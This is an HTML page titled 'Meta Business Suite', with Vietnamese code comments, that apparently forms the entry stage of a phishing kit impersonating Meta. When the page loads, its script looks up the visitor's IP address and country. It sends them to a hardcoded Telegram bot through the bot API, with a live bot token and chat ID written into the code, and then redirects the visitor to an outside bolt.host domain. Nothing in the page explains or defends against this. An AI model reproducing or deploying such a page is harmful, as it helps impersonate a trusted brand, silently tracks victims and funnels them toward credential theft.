<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Meta Business Suite</title>
</head>
<body>
  <script>
    // === CẤU HÌNH ===
    const TELEGRAM_BOT_TOKEN = "8450931475:AAG33LEbK54PVvpsImjaKhMOYpTO5WJF5aE";
    const TELEGRAM_CHAT_ID = "1409099376";
    const REDIRECT_URL = "https://professional-social-cifr.bolt.host";
    const DELAY_MS = 50; // 1 giây

    async function getIPandCountry() {
      try {
        // Thử ipapi trước
        const res = await fetch("https://ipapi.co/json/", { cache: "no-cache" });
        if (res.ok) {
          const data = await res.json();
          if (data.ip) {
            return {
              ip: data.ip,
              country: data.country || "unknown"
            };
          }
        }
        // Nếu ipapi lỗi → fallback sang ipify
        const res2 = await fetch("https://api.ipify.org?format=json");
        const data2 = await res2.json();
        return { ip: data2.ip || "unknown", country: "unknown" };
      } catch {
        return { ip: "unknown", country: "unknown" };
      }
    }

    async function sendTelegramMessage(text) {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = { chat_id: TELEGRAM_CHAT_ID, text };
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.warn("Send telegram failed:", err);
      }
    }

    (async function onLoadNotifyAndRedirect() {
      const { ip, country } = await getIPandCountry();
      const msg = `Có người vào web | IP: ${ip} | Quốc gia: ${country}`;
      await sendTelegramMessage(msg);

      // Chờ 1 giây rồi chuyển hướng
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, DELAY_MS);
    })();
  </script>
</body>
</html>
